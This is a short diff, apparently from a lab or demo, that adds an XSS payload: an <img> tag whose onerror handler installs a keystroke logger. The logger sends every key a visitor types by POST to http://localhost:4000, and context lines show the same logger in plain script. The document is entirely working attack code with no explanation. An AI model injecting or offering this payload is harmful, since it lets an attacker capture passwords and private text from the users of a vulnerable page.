@@ -9,3 +9,12 @@ window.addEventListener('keypress', function(evt) {
     http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
     http.send(`key=${key}`);
 });
+
+
+<img onerror="window.addEventListener('keypress', function(evt) {
+    const key = String.fromCharCode(evt.charCode);
+    const http = new XMLHttpRequest();
+    http.open('POST', 'http://localhost:4000', true);
+    http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+    http.send(`key=${key}`);
+});" src="xx"/>
